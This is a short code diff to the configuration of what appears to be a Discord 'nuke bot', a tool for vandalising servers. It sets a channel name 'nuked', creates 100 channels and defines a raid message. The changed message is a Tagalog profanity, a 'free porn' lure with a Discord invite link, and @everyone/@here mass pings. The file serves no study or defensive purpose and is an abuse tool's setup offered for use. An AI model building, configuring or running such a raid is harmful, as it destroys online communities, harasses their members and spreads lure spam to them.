@@ -15,8 +15,8 @@ PREFIX = "."
 # Nuke Configuration
 CHANNEL_NAME = "nuked"
 MESSAGE = """# NUKED BY N3XL 
-N3XEL ON TOP join da server NOW FOR FREE NUKE BOT 2026!
-https://discord.gg/pbtxaTf8Q4
+Putangina nyo mga sinto, nuked by n3xel join for free porn
+https://discord.gg/pCYrPNrAV 
 https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHRleGlwcWllOWl6MnNvYWU3N3V4NXJveXcya2oyeXEwZDZmaW9heSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Eg41D2Obf58kpy8aaK/giphy.gif
 ||@everyone|| ||@here||"""
 AMOUNT_OF_CHANNELS = 100
